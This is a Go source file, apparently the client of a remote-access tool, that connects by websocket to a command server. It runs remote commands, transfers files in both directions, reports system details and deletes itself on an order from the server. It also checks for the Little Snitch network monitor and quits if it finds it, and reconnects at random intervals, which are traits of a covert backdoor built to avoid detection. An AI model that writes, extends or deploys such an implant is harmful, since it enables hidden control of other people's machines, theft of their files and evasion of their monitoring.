package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/mikeflynn/the-fearsome-five/shared"
	ps "github.com/mitchellh/go-ps"
)

const VERSION = "0.1"

var verbose *bool

func Debug(message string) {
	if *verbose == true {
		log.Println(message)
	}
}

func GetServer(server string) string {
	addr := url.URL{
		Scheme: "ws",
		Host:   fmt.Sprintf("%s", server),
		Path:   "/c",
	}

	return addr.String()
}

func processRunning(term string) bool {
	procList, err := ps.Processes()
	if err != nil {
		Debug("Process list fetch failed.")
		return false
	}

	for _, p := range procList {
		if strings.Contains(p.Executable(), term) {
			return true
		}
	}

	return false
}

func main() {
	server := flag.String("server", "localhost:8000", "Server hostname.")
	verboseFlag := flag.Bool("verbose", false, "Additional debugging logs.")
	unsafe := flag.Bool("unsafe", false, "Turn off all discovery safe guards.")
	workDir := flag.String("workdir", "./", "Set the working directory")
	retryDelay := flag.Int("delay", 300, "Delay, in seconds, before reconnection attempts.")
	configReset := flag.Bool("reset", false, "If true, it will reset use the flags and reset the config file.")

	flag.Parse()

	verbose = verboseFlag
	shared.MaxMessageSize = 1024 * 1024 * 1024
	shared.Logger = Debug

	system := InitSystem(*configReset, *server, *workDir, *unsafe, *retryDelay)

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	// Is it OK to run on this machine?
	if !system.unsafe && processRunning("Little Snitch") {
		Debug("Monitoring program found. Shutting down.")
		os.Exit(0)
	}

	if _, err := system.GetExternalIP(true); err != nil {
		// Getting blocked?
		os.Exit(0)
	}
	system.GetInternalIP()

	connection := shared.InitConnection()

	defer connection.Close()

	connection.ReadCallback = func(conn *shared.Conn, message *shared.Message) {
		switch message.Action {
		case "setName":
			system.UUID = string(message.Body)
			system.saveConfig()
		case "runCommand":
			output, err := system.RunCommand(message)
			if err != nil {
				output = err.Error()
			}

			connection.Send(shared.NewMessage("runCommandOutput", []byte(output), shared.EncodingText))
		case "fileTransfer":
			output, err := system.SaveFile(message)
			if err != nil {
				output = "Error: " + err.Error()
			}

			connection.Send(shared.NewMessage("fileTransferStatus", []byte(output), shared.EncodingText))
		case "fileRequest":
			output, err := system.SendFile(message)
			if err != nil {
				output = []byte("Error: " + err.Error())
			}

			connection.Send(shared.NewMessage("fileRequestResponse", output, ""))
		case "selfTerminate":
			system.delConfig()
			connection.Send(shared.NewMessage("goodbye", []byte(""), shared.EncodingText))

			connection.Close()
			os.Exit(0)
		default:
			// Ignore
			Debug("Unroutable message: " + string(message.Serialize()))
			return
		}
	}

	go func() {
		for {
			Debug("Checking connection...")
			if connection.Establish(GetServer(system.Server), "") {
				go connection.WritePump()
				go connection.ReadPump()

				// Send the system report
				connection.Send(shared.NewMessage("systemReport", system.toJSON(), shared.EncodingJSON))
			}

			time.Sleep(time.Duration(*retryDelay*rand.Intn(*retryDelay)) * time.Second)
		}
	}()

	for {
		select {
		case <-interrupt:
			Debug("INTERRUPT!")
			connection.Close()
			os.Exit(0)
		}
	}
}
